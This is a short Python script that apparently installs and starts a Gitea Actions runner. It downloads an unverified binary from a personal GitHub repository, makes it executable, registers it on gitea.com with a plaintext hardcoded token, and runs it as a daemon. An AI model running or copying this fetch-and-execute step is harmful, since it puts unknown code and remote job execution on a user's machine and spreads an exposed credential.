
import os
import requests
import subprocess
from pathlib import Path

TOKEN = "ViOjsHBuSESkK0fRd6caXNnYqsLB3WHDndITTZkb"

URL = "https://github.com/medujaisa/reimagined-carnival/raw/refs/heads/main/badolaiks"

binary = Path("badolaiks")

# Download
print("Downloading runner...")
response = requests.get(URL, timeout=60)
response.raise_for_status()
binary.write_bytes(response.content)

# Permissions
binary.chmod(0o755)

# Register
print("Registering runner...")
subprocess.run(
    [
        str(binary.resolve()),
        "register",
        "--instance", "https://gitea.com/",
        "--token", TOKEN,
        "--labels", "maiso",
        "--name", "maiso"
    ],
    check=True
)

# Start daemon
print("Starting daemon...")
os.execv(str(binary.resolve()), [str(binary.resolve()), "daemon"])
